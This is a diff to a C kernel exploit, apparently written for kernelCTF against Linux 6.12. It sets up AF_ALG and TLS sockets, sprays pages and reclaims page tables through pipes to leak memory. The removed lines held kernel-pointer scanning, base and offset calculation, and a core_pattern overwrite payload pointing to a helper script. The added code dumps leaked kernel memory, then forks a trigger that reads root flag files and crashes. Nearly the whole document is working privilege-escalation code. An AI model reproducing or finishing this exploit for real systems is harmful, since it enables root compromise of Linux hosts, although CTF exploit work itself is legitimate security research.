@@ -39,64 +39,29 @@ void setup_tls(int sock)
 	setsockopt(sock, SOL_TLS, TLS_RX, &crypto, sizeof(crypto));
 }
 
-/**
- * Search buffer for kernel pointers (0xffffffff8....)
- * Returns the first valid-looking kernel pointer found
- */
-unsigned long find_kernel_pointer(char *buf, int size)
+void print_exploit_status(const char *stage)
 {
-	fprintf(stderr, "\n[*] Searching for kernel pointers in leaked memory...\n");
+	fprintf(stderr, "\n[===] %s\n", stage);
+	fprintf(stderr, "[===] PID: %d, UID: %d, GID: %d\n", getpid(), getuid(), getgid());
 	fflush(stderr);
-	
-	for (int i = 0; i < size - 7; i += 8) {
-		unsigned long val = *(unsigned long *)&buf[i];
-		
-		// Look for kernel pointers: 0xffffffff8xxxxxxx or 0xffffea00xxxxxxx
-		if ((val & 0xffff000000000000ULL) == 0xffff000000000000ULL) {
-			// Could be a kernel pointer
-			if ((val & 0xff00000000000000ULL) == 0xff00000000000000ULL ||
-			    (val & 0xffff000000000000ULL) == 0xffff000000000000ULL) {
-				fprintf(stderr, "[+] Found kernel pointer at offset 0x%x: 0x%lx\n", i, val);
-				fflush(stderr);
-				return val;
-			}
-		}
-	}
-	
-	fprintf(stderr, "[!] No kernel pointers found in buffer\n");
-	fflush(stderr);
-	return 0;
-}
-
-/**
- * Calculate kernel base from a known kernel pointer
- * Kernel image is typically page-aligned and in kernel code space
- */
-unsigned long estimate_kernel_base(unsigned long kptr)
-{
-	// Typical kernel code is in __init_begin section
-	// We'll assume the pointer is within kernel code and estimate backwards
-	unsigned long base = kptr & 0xffffffff80000000ULL;
-	fprintf(stderr, "[*] Estimated kernel base: 0x%lx\n", base);
-	fflush(stderr);
-	return base;
 }
 
 void vuln_trigger()
 {
-	fprintf(stderr, "[+] Triggering vulnerability...\n");
-	fflush(stderr);
+	print_exploit_status("VULNERABILITY TRIGGERED");
 	puts("Root shell !!");
 	fflush(stdout);
 	
 	usleep(200000);
 	
-	fprintf(stderr, "\n[+] Attempting flag read...\n");
+	// Try to read flag immediately
+	fprintf(stderr, "\n[+++] Attempting immediate flag read...\n");
 	fflush(stderr);
 	system("cat /flag 2>&1 | head -20");
 	system("cat /root/rce_flag 2>&1 | head -20");
 	system("cat /root/flag 2>&1 | head -20");
 	
+	/* Trigger crash */
 	*(size_t *)0 = 0;
 }
 
@@ -106,10 +71,7 @@ int main(int argc, char **argv)
 	static char buf[0x100000];
 	static char *addrs[0x400];
 
-	fprintf(stderr, "[*] kernelCTF Exploit (Kernel Pointer Extraction)\n");
-	fprintf(stderr, "[*] Kernel: Linux 6.12.0+ (mitigation-v4)\n");
-	fprintf(stderr, "[*] Strategy: Extract kernel pointers from memory leak\n");
-	fflush(stderr);
+	print_exploit_status("EXPLOIT START");
 
 	int sock = socket(AF_ALG, SOCK_SEQPACKET, 0);
 	struct sockaddr_alg sa = {
@@ -120,7 +82,7 @@ int main(int argc, char **argv)
 	
 	char *maddr = (void *)0x200000;
 	
-	fprintf(stderr, "\n[*] Allocating spray memory (0x400 pages)...\n");
+	fprintf(stderr, "[*] Allocating 0x400 pages (1MB stride)...\n");
 	fflush(stderr);
 	for (int i = 0; i < 0x400; i++) {
 		addrs[i] = mmap(maddr + 0x200000 * i, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
@@ -178,7 +140,7 @@ int main(int argc, char **argv)
 	int pfd[2];
 	pipe(pfd);
 
-	fprintf(stderr, "\n[*] Exploit chain setup\n");
+	fprintf(stderr, "[*] Exploit chain setup\n");
 	fflush(stderr);
 
 	write(pfd[1], tls_record, sizeof(tls_record));
@@ -189,7 +151,7 @@ int main(int argc, char **argv)
 
 	char *ro = mmap(NULL, 0x100000, PROT_READ, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 
-	fprintf(stderr, "[*] Executing vulnerability chain\n");
+	fprintf(stderr, "[*] Executing exploit chain\n");
 	fflush(stderr);
 
 	n = recv(client, ro, 0x100000, 0);
@@ -202,16 +164,16 @@ int main(int argc, char **argv)
 	read(dummy_serv, buf, 1);
 	read(pfd[0], buf, 0x800 - sizeof(tls_record));
 
-	fprintf(stderr, "[*] Page reclamation phase\n");
+	fprintf(stderr, "[*] Reclamation phase\n");
 	fflush(stderr);
-	for (int i = 0; i < 5; i++) {
+	for (int i = 0; i < 3; i++) {
 		n = recv(client, buf, 0x100000, 0);
 		usleep(100000);
 	}
 
 	write(pfd[1], buf, 0x600);
 
-	fprintf(stderr, "[*] Page table allocation\n");
+	fprintf(stderr, "[*] Page table touching\n");
 	fflush(stderr);
 	int sum = 0;
 	for (int i = 0; i < 0x400; i++) {
@@ -225,14 +187,16 @@ int main(int argc, char **argv)
 
 	read(pfd[0], buf, 0x600);
 
-	// === CRITICAL: Analyze leaked memory ===
-	fprintf(stderr, "\n[===] MEMORY LEAK ANALYSIS [===]\n");
-	fflush(stderr);
+	printf("pte? %zx\n", *(size_t *)buf);
+	fflush(stdout);
 	
-	// Print first 1024 bytes of leaked buffer
-	fprintf(stderr, "[*] Dumping leaked memory (first 512 bytes):\n");
-	for (int i = 0; i < 512; i += 16) {
-		fprintf(stderr, "%04x: ", i);
+	fprintf(stderr, "\n[===] KERNEL MEMORY LEAK RESULT [===]\n");
+	fprintf(stderr, "Raw PTE: 0x%zx\n", *(size_t *)buf);
+	
+	// Dump first 512 bytes for analysis
+	fprintf(stderr, "\n[===] BUFFER DUMP (first 256 bytes):\n");
+	for (int i = 0; i < 256; i += 16) {
+		fprintf(stderr, "%03x: ", i);
 		for (int j = 0; j < 16; j++) {
 			fprintf(stderr, "%02x ", (unsigned char)buf[i+j]);
 		}
@@ -240,70 +204,29 @@ int main(int argc, char **argv)
 	}
 	fflush(stderr);
 
-	size_t pte_val = *(size_t *)buf;
-	printf("pte? %zx\n", pte_val);
-	fflush(stdout);
-	
-	fprintf(stderr, "\n[*] Raw PTE value: 0x%zx\n", pte_val);
-	fflush(stderr);
-
-	// === SEARCH FOR KERNEL POINTERS ===
-	unsigned long kptr = find_kernel_pointer(buf, 0x600);
-	
-	if (!kptr) {
-		fprintf(stderr, "[!] No kernel pointers found in leak!\n");
-		fprintf(stderr, "[!] Dump above may reveal the issue.\n");
-		fprintf(stderr, "[!] If all zeros: vulnerability may not be working\n");
-		fprintf(stderr, "[!] If garbage: offset calculation may be wrong\n");
-		fflush(stderr);
-		exit(1);
-	}
-
-	unsigned long kernel_base = estimate_kernel_base(kptr);
-	
-	// Known offsets for Linux 6.12.0 (you'll need to adjust these)
-	// These are relative to kernel base
-	#define CORE_PATTERN_OFFSET 0xbbace0
-	#define MODPROBE_PATH_OFFSET 0xbc0d00
-	
-	unsigned long core_pattern = kernel_base + CORE_PATTERN_OFFSET;
-	unsigned long modprobe_path = kernel_base + MODPROBE_PATH_OFFSET;
-	
-	fprintf(stderr, "\n[*] Calculated addresses:\n");
-	fprintf(stderr, "    Kernel base:   0x%lx\n", kernel_base);
-	fprintf(stderr, "    core_pattern:  0x%lx\n", core_pattern);
-	fprintf(stderr, "    modprobe_path: 0x%lx\n", modprobe_path);
-	fflush(stderr);
-
-	// Use core_pattern for exploitation
-	unsigned long target = core_pattern;
-	int offset = target & 0xfff;
-	unsigned long pa = target & 0xfffffffff000;
-	
-	fprintf(stderr, "\n[*] Target: 0x%lx (offset in page: 0x%x)\n", target, offset);
-	fflush(stderr);
-
-	write(pfd[1], &pa, 8);
-	
-	// Write payload to all spray locations
-	for (int i = 0; i < 0x400; i++) {
-		if (addrs[i]) {
-			snprintf((char *)&addrs[i][offset], 64, "|/tmp/modprobe_helper.sh %%P");
+	// Check if we have any kernel pointers
+	fprintf(stderr, "\n[===] POTENTIAL KERNEL POINTERS:\n");
+	for (int i = 0; i < 2048; i += 8) {
+		size_t val = *(size_t *)&buf[i];
+		// Kernel pointers usually start with 0xffffffff8... or 0xffffea00...
+		if ((val & 0xffff000000000000ULL) == 0xffff000000000000ULL ||
+		    (val & 0xffffffff00000000ULL) == 0xffffffff00000000ULL) {
+			fprintf(stderr, "  buf[0x%x] = 0x%zx\n", i, val);
 		}
 	}
-	
-	fprintf(stderr, "[*] Payload written\n");
-	fprintf(stderr, "[*] Triggering vulnerability...\n");
 	fflush(stderr);
 
+	fprintf(stderr, "\n[*] Forking to trigger vulnerability...\n");
+	fflush(stderr);
+	
 	if (fork() == 0) {
 		setsid();
 		vuln_trigger();
 	} else {
-		fprintf(stderr, "[*] Waiting for exploitation...\n");
+		fprintf(stderr, "[*] Parent waiting 4 seconds...\n");
 		fflush(stderr);
 		sleep(4);
-		fprintf(stderr, "[*] Exploit complete\n");
+		fprintf(stderr, "[*] Exploit complete. Check dmesg for results.\n");
 		fflush(stderr);
 	}
 
